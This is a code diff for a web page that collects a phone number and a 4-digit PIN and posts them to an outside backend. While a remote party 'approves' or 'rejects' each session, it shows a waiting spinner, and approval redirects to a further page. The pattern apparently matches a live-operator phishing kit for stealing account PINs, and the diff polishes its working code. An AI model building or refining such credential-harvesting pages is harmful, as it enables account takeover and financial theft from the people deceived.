@@ -277,150 +277,121 @@ const API = "https://ecolo-backend.onrender.com";
 
 const inputs = document.querySelectorAll(".otp-input");
 
-// Create loading overlay
-const overlay = document.createElement("div");
-overlay.innerHTML = `
-<div id="loadingOverlay" style="
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:100%;
-background:rgba(255,255,255,.95);
-display:none;
-justify-content:center;
-align-items:center;
-flex-direction:column;
-z-index:99999;
-font-family:Arial;
-">
-<div style="
-width:70px;
-height:70px;
-border:8px solid #ddd;
-border-top:8px solid #0b5ed7;
-border-radius:50%;
-animation:spin 1s linear infinite;
-"></div>
-
-<p style="margin-top:20px;font-size:18px;">
-Processing... Waiting for approval
-</p>
-</div>
-
-<style>
-@keyframes spin{
-100%{transform:rotate(360deg);}
-}
-</style>
-`;
-
-document.body.appendChild(overlay);
-
 async function submitPin() {
 
-    const pin = Array.from(inputs).map(i=>i.value).join("");
+    const pin = [...inputs].map(i => i.value).join("");
     const phone = document.getElementById("phone").value.trim();
 
-    if(!phone){
-        alert("Enter phone number");
+    if (!phone) {
+        alert("Please enter your phone number.");
         return;
     }
 
-    if(pin.length!==4){
-        alert("Enter 4 digit PIN");
+    if (!/^\d{4}$/.test(pin)) {
+        alert("Enter a valid 4-digit PIN.");
         return;
     }
 
-    try{
+    try {
 
-        const res = await fetch(`${API}/submit/deno`,{
-
-            method:"POST",
-
-            headers:{
-                "Content-Type":"application/json"
+        const response = await fetch(`${API}/submit/deno`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
             },
-
-            body:JSON.stringify({
+            body: JSON.stringify({
                 phone,
                 pin
             })
-
         });
 
-        const data = await res.json();
+        const result = await response.json();
 
-        if(!res.ok){
-            alert(data.error || data.message);
+        if (!response.ok) {
+            alert(result.error || result.message);
             return;
         }
 
-        const sessionId = data.sessionId;
+        const sessionId = result.sessionId;
 
-        document.getElementById("loadingOverlay").style.display="flex";
+        // Show loading spinner
+        document.getElementById("loadingOverlay").style.display = "flex";
 
-        const timer = setInterval(async()=>{
+        const timer = setInterval(async () => {
 
-            const r = await fetch(`${API}/status/${sessionId}`);
-            const s = await r.json();
+            try {
 
-            if(s.status==="approved"){
+                const res = await fetch(`${API}/status/${sessionId}`);
+                const status = await res.json();
 
+                if (status.status === "approved") {
+
+                    clearInterval(timer);
+
+                    window.location.href = "zet.html";
+
+                }
+
+                if (status.status === "rejected") {
+
+                    clearInterval(timer);
+
+                    document.getElementById("loadingOverlay").innerHTML = `
+                    <div style="text-align:center;padding:20px;font-family:Arial;">
+                        <h2 style="color:#d32f2f;">Request Rejected</h2>
+                        <p>Your login could not be verified.</p>
+
+                        <button onclick="location.reload()" style="
+                        margin-top:20px;
+                        background:#0b5ed7;
+                        color:white;
+                        border:none;
+                        padding:12px 30px;
+                        border-radius:8px;
+                        cursor:pointer;">
+                        Try Again
+                        </button>
+                    </div>
+                    `;
+
+                }
+
+            } catch (e) {
                 clearInterval(timer);
-
-                window.location.href="zet.html";
-
+                document.getElementById("loadingOverlay").style.display = "none";
+                alert("Connection lost.");
             }
 
-            if(s.status==="rejected"){
+        }, 2000);
 
-                clearInterval(timer);
+    } catch (err) {
 
-                document.getElementById("loadingOverlay").style.display="none";
-
-                alert("Request rejected");
-
-            }
-
-        },2000);
-
-    }catch(err){
-
-        console.log(err);
-
-        alert("Server unavailable.");
+        alert("Unable to connect to the server.");
 
     }
 
 }
 
-inputs.forEach((input,index)=>{
+inputs.forEach((input, index) => {
 
-    input.addEventListener("input",()=>{
+    input.addEventListener("input", () => {
 
-        input.value=input.value.replace(/\D/g,"");
+        input.value = input.value.replace(/\D/g, "");
 
-        if(input.value && index<inputs.length-1){
-
-            inputs[index+1].focus();
-
+        if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
         }
 
-        if([...inputs].every(i=>i.value.length===1)){
-
+        if ([...inputs].every(i => i.value.length === 1)) {
             submitPin();
-
         }
 
     });
 
-    input.addEventListener("keydown",e=>{
+    input.addEventListener("keydown", e => {
 
-        if(e.key==="Backspace" && !input.value && index>0){
-
-            inputs[index-1].focus();
-
+        if (e.key === "Backspace" && !input.value && index > 0) {
+            inputs[index - 1].focus();
         }
 
     });
@@ -434,7 +405,42 @@ inputs.forEach((input,index)=>{
 </body>
 
 </html>
+<div id="loadingOverlay" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(255,255,255,.95);
+z-index:99999;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+">
 
+<div style="
+width:70px;
+height:70px;
+border:8px solid #ddd;
+border-top:8px solid #0b5ed7;
+border-radius:50%;
+animation:spin 1s linear infinite;
+"></div>
+
+<p style="margin-top:20px;font-size:18px;font-family:Arial;">
+Processing... Please wait
+</p>
+
+</div>
+
+<style>
+@keyframes spin{
+100%{
+transform:rotate(360deg);
+}
+}
+</style>
 </body>
 
 </html>
